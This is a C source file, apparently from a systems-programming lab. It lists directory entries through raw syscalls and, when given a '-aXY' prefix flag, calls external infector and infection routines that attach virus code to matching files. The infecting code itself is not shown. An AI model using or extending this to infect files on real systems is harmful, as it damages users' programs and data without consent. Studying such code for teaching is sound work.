#include "../util.h"

#define SYS_EXIT     1
#define SYS_READ     3
#define SYS_WRITE    4
#define SYS_OPEN     5
#define SYS_CLOSE    6
#define SYS_GETDENTS 141

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define O_RDONLY 0

extern int system_call();
extern void infection();
extern void infector(char *fileName);

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main (int argc , char* argv[], char* envp[])
{
    int i;
    int prefix_used = 0;
    char p1 = 0, p2 = 0;

    /* parse optional -aXY argument */
    for (i = 1; i < argc; i++) {
        char *s = argv[i];
        if (s[0] == '-' && s[1] == 'a') {
            prefix_used = 1;
            p1 = s[2];
            p2 = s[3];
        }
    }

    /* open current directory "." */
    int fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    /* read directory entries */
    char buf[8192];
    int nread = system_call(SYS_GETDENTS, fd, buf, sizeof(buf));
    if (nread < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    /* iterate entries in buffer */
    int bpos = 0;
    while (bpos < nread) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
        char *name = d->d_name;

        int print_this = 1;
        if (prefix_used) {
            if (!(name[0] == p1 && name[1] == p2)) {
                print_this = 0;
            }
        }

        if (print_this) {
            int len = strlen(name);
            system_call(SYS_WRITE, STDOUT, name, len);
            system_call(SYS_WRITE, STDOUT, "\n", 1); 

            if (prefix_used) {
                /* attach virus code to this file */
                infector(name);
                system_call(SYS_WRITE, STDOUT,
                            " VIRUS ATTACHED", 15);
            }

            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }

        bpos += d->d_reclen;
    }

    system_call(SYS_CLOSE, fd, 0, 0);

    /* call infection() once if -a was supplied */
    if (prefix_used) {
        infection();
    }

    system_call(SYS_EXIT, 0, 0, 0);

    return 0; /* never reached */
}
